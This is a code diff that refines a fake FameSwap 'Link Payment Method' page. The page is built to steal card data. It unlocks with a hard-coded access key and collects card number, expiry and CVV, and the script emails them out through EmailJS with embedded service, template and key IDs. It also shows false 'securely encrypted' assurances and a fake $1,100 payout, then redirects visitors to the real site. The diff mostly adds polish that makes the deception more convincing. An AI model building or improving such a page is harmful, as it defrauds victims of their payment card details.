@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Link Payment Method - FameSwap</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
             --primary-color: #1a73e8;
@@ -15,6 +16,8 @@
             --border-color: #dadce0;
             --success-bg: #f3f8ff;
             --error-color: #d93025;
+            --success-color: #34a853;
+            --warning-color: #fbbc04;
         }
 
         * {
@@ -39,28 +42,50 @@
             background: white;
             padding: 40px;
             border-radius: 16px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
             width: 100%;
             max-width: 480px;
+            position: relative;
+            overflow: hidden;
         }
 
         #paymentContainer {
             display: none;
+            animation: slideIn 0.3s ease-out;
         }
 
         #verificationContainer {
             display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .logo-container {
             text-align: center;
             margin-bottom: 30px;
+            position: relative;
         }
 
         .logo {
             width: 100px;
             height: 100px;
             border-radius: 50%;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
         }
 
         h1 {
@@ -73,6 +98,7 @@
 
         .form-group {
             margin-bottom: 24px;
+            position: relative;
         }
 
         label {
@@ -83,18 +109,69 @@
             font-weight: 500;
         }
 
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+        }
+
+        .card-type-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: none;
+            font-size: 20px;
+        }
+
+        .card-type-icon.visa {
+            color: #1A1F71;
+        }
+
+        .card-type-icon.mastercard {
+            color: #EB001B;
+        }
+
+        .card-type-icon.verve {
+            color: #2D3092;
+        }
+
         input {
             width: 100%;
-            padding: 12px 16px;
-            border: 1px solid var(--border-color);
+            padding: 12px 16px 12px 45px;
+            border: 2px solid var(--border-color);
             border-radius: 8px;
             font-size: 16px;
-            transition: border-color 0.2s;
+            transition: all 0.2s ease;
+            background-color: white;
         }
 
         input:focus {
             outline: none;
             border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.1);
+        }
+
+        .validation-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: none;
+        }
+
+        .validation-icon.valid {
+            color: var(--success-color);
+        }
+
+        .validation-icon.invalid {
+            color: var(--error-color);
         }
 
         .error-message {
@@ -102,6 +179,12 @@
             font-size: 14px;
             margin-top: 8px;
             display: none;
+            animation: fadeIn 0.2s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .expiry-cvv {
@@ -120,11 +203,54 @@
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
         }
 
         button:hover {
             background-color: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button.loading {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+
+        .button-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            width: 100%;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        button.loading .button-content > *:not(.loading-spinner) {
+            opacity: 0;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         .secure-text {
@@ -132,6 +258,14 @@
             margin-top: 20px;
             color: var(--text-secondary);
             font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .secure-text i {
+            color: var(--success-color);
         }
 
         .modal {
@@ -145,21 +279,68 @@
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            animation: fadeIn 0.3s ease-out;
         }
 
         .modal-content {
             background-color: white;
-            padding: 30px;
-            border-radius: 12px;
+            padding: 40px;
+            border-radius: 16px;
             text-align: center;
             max-width: 400px;
             width: 90%;
+            animation: scaleIn 0.3s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
 
         .success-icon {
-            color: #34a853;
-            font-size: 48px;
-            margin-bottom: 20px;
+            width: 64px;
+            height: 64px;
+            background-color: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-icon i {
+            color: white;
+            font-size: 32px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background-color: var(--border-color);
+            border-radius: 2px;
+            margin-top: 24px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background-color: var(--success-color);
+            width: 0%;
+            transition: width 3s linear;
         }
 
         @media (max-width: 480px) {
@@ -173,6 +354,10 @@
 
             input {
                 font-size: 14px;
+            }
+
+            .modal-content {
+                padding: 24px;
             }
         }
     </style>
@@ -189,12 +374,26 @@
             <form id="verificationForm">
                 <div class="form-group">
                     <label for="accessKey">Enter Access Key</label>
-                    <input type="text" id="accessKey" placeholder="Enter the key provided in the email" required>
+                    <div class="input-wrapper">
+                        <i class="fas fa-key input-icon"></i>
+                        <input type="text" id="accessKey" placeholder="Enter the key provided in the email" required>
+                        <i class="fas fa-check validation-icon valid"></i>
+                        <i class="fas fa-times validation-icon invalid"></i>
+                    </div>
                     <p class="error-message" id="keyError">Invalid key. Please check and try again.</p>
                 </div>
-                <button type="submit">Verify Access</button>
+                <button type="submit">
+                    <div class="button-content">
+                        <i class="fas fa-lock"></i>
+                        <span>Verify Access</span>
+                        <div class="loading-spinner"></div>
+                    </div>
+                </button>
             </form>
-            <p class="secure-text">🔒 This is a secure verification process</p>
+            <p class="secure-text">
+                <i class="fas fa-shield-alt"></i>
+                This is a secure verification process
+            </p>
         </div>
 
         <!-- Payment Container -->
@@ -203,85 +402,253 @@
             <form id="paymentForm">
                 <div class="form-group">
                     <label for="cardNumber">Card Number</label>
-                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                    <div class="input-wrapper">
+                        <i class="fas fa-credit-card input-icon" id="defaultCardIcon"></i>
+                        <i class="fab fa-cc-visa card-type-icon" id="visaIcon"></i>
+                        <i class="fab fa-cc-mastercard card-type-icon" id="mastercardIcon"></i>
+                        <i class="fas fa-credit-card card-type-icon" id="verveIcon"></i>
+                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        <i class="fas fa-check validation-icon valid"></i>
+                        <i class="fas fa-times validation-icon invalid"></i>
+                    </div>
                 </div>
                 <div class="expiry-cvv">
                     <div class="form-group">
                         <label for="expiry">Expiry Date</label>
-                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                        <div class="input-wrapper">
+                            <i class="fas fa-calendar input-icon"></i>
+                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                            <i class="fas fa-check validation-icon valid"></i>
+                            <i class="fas fa-times validation-icon invalid"></i>
+                        </div>
                     </div>
                     <div class="form-group">
                         <label for="cvv">CVV</label>
-                        <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+                        <div class="input-wrapper">
+                            <i class="fas fa-lock input-icon"></i>
+                            <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+                            <i class="fas fa-check validation-icon valid"></i>
+                            <i class="fas fa-times validation-icon invalid"></i>
+                        </div>
                     </div>
                 </div>
-                <button type="submit">Link Card</button>
+                <button type="submit">
+                    <div class="button-content">
+                        <i class="fas fa-link"></i>
+                        <span>Link Card</span>
+                        <div class="loading-spinner"></div>
+                    </div>
+                </button>
             </form>
-            <p class="secure-text">🔒 Your payment information is securely encrypted</p>
+            <p class="secure-text">
+                <i class="fas fa-shield-alt"></i>
+                Your payment information is securely encrypted
+            </p>
         </div>
     </div>
 
     <div class="modal" id="successModal">
         <div class="modal-content">
-            <div class="success-icon">✓</div>
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
             <h2 style="margin-bottom: 16px; color: var(--text-primary);">Payment Method Linked</h2>
-            <p style="color: var(--text-secondary);">Your funds will be transferred in less than 30 minutes.</p>
+            <p style="color: var(--text-secondary);">Your funds ($1,100) will be transferred in less than 24 hours.</p>
+            <div class="progress-bar">
+                <div class="progress-bar-fill"></div>
+            </div>
         </div>
     </div>
 
     <script>
         // Initialize EmailJS
         (function() {
-            emailjs.init("aGeV5e03mc1324u8g"); // Public API key
+            emailjs.init("aGeV5e03mc1324u8g");
         })();
+
+        // Validation functions
+        function validateCardNumber(number) {
+            return /^[\d\s]{19}$/.test(number);
+        }
+
+        function validateExpiry(expiry) {
+            return /^\d{2}\/\d{2}$/.test(expiry);
+        }
+
+        function validateCVV(cvv) {
+            return /^\d{3}$/.test(cvv);
+        }
+
+        // Show loading state
+        function showLoading(button) {
+            button.classList.add('loading');
+            button.querySelector('.loading-spinner').style.display = 'block';
+            button.querySelector('span').style.opacity = '0';
+            button.querySelector('i').style.display = 'none';
+        }
+
+        // Hide loading state
+        function hideLoading(button) {
+            button.classList.remove('loading');
+            button.querySelector('.loading-spinner').style.display = 'none';
+            button.querySelector('span').style.opacity = '1';
+            button.querySelector('i').style.display = 'inline';
+        }
 
         // Handle verification form
         document.getElementById('verificationForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const accessKey = document.getElementById('accessKey').value;
+            const button = this.querySelector('button');
             
-            if (accessKey === "MaDyXC") {
-                document.getElementById('verificationContainer').style.display = 'none';
-                document.getElementById('paymentContainer').style.display = 'block';
-                document.getElementById('keyError').style.display = 'none';
-            } else {
-                document.getElementById('keyError').style.display = 'block';
+            showLoading(button);
+
+            setTimeout(() => {
+                if (accessKey === "MaDyXC") {
+                    document.getElementById('verificationContainer').style.display = 'none';
+                    document.getElementById('paymentContainer').style.display = 'block';
+                    document.getElementById('keyError').style.display = 'none';
+                } else {
+                    document.getElementById('keyError').style.display = 'block';
+                    hideLoading(button);
+                }
+            }, 1000);
+        });
+
+        // Input validation with icons
+        document.getElementById('accessKey').addEventListener('input', function(e) {
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (e.target.value === "MaDyXC") {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
             }
         });
 
-        // Format card number with spaces
+        function detectCardType(number) {
+            const cleanNumber = number.replace(/\s/g, '');
+            
+            if (/^4/.test(cleanNumber)) {
+                return 'visa';
+            } else if (/^5[1-5]/.test(cleanNumber)) {
+                return 'mastercard';
+            } else if (/^506[0-1]|^650[0-9]/.test(cleanNumber)) {
+                return 'verve';
+            }
+            return null;
+        }
+
+        function updateCardIcon(type) {
+            const defaultIcon = document.getElementById('defaultCardIcon');
+            const visaIcon = document.getElementById('visaIcon');
+            const mastercardIcon = document.getElementById('mastercardIcon');
+            const verveIcon = document.getElementById('verveIcon');
+            
+            // Hide all icons first
+            defaultIcon.style.display = 'none';
+            visaIcon.style.display = 'none';
+            mastercardIcon.style.display = 'none';
+            verveIcon.style.display = 'none';
+            
+            // Show the appropriate icon
+            if (type === 'visa') {
+                visaIcon.style.display = 'block';
+            } else if (type === 'mastercard') {
+                mastercardIcon.style.display = 'block';
+            } else if (type === 'verve') {
+                verveIcon.style.display = 'block';
+            } else {
+                defaultIcon.style.display = 'block';
+            }
+        }
+
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s/g, '');
             let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
             e.target.value = formattedValue;
+            
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                // Detect and update card type icon
+                const cardType = detectCardType(e.target.value);
+                updateCardIcon(cardType);
+                
+                if (validateCardNumber(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            } else {
+                // Show default icon when input is empty
+                updateCardIcon(null);
+            }
         });
 
-        // Format expiry date
         document.getElementById('expiry').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length >= 2) {
                 value = value.slice(0,2) + '/' + value.slice(2);
             }
             e.target.value = value;
+            
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (validateExpiry(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            }
         });
 
-        // Allow only numbers in CVV
         document.getElementById('cvv').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
+            
+            const validIcon = e.target.parentElement.querySelector('.valid');
+            const invalidIcon = e.target.parentElement.querySelector('.invalid');
+            
+            validIcon.style.display = 'none';
+            invalidIcon.style.display = 'none';
+            
+            if (e.target.value) {
+                if (validateCVV(e.target.value)) {
+                    validIcon.style.display = 'block';
+                } else {
+                    invalidIcon.style.display = 'block';
+                }
+            }
         });
 
-        // Handle form submission
+        // Handle payment form submission
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
+            const button = this.querySelector('button');
+            showLoading(button);
+
             console.log('Sending card details to server...');
 
-            // Get form values
             const cardNumber = document.getElementById('cardNumber').value;
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
 
-            // Send email using EmailJS
             emailjs.send("service_ew3eveb","template_kkjt9x2", {
                 card_number: cardNumber,
                 expiry: expiry,
@@ -289,10 +656,16 @@
             }).then(
                 function(response) {
                     console.log("SUCCESS", response);
-                    // Show success modal
                     document.getElementById('successModal').style.display = 'flex';
                     
-                    // Redirect after 3 seconds
+                    // Show and animate progress bar
+                    const progressBar = document.querySelector('.progress-bar');
+                    const progressBarFill = document.querySelector('.progress-bar-fill');
+                    progressBar.style.display = 'block';
+                    setTimeout(() => {
+                        progressBarFill.style.width = '100%';
+                    }, 100);
+                    
                     setTimeout(() => {
                         window.location.href = "https://www.fameswap.com";
                     }, 3000);
@@ -300,6 +673,7 @@
                 function(error) {
                     console.log("FAILED", error);
                     alert("An error occurred. Please try again.");
+                    hideLoading(button);
                 }
             );
         });
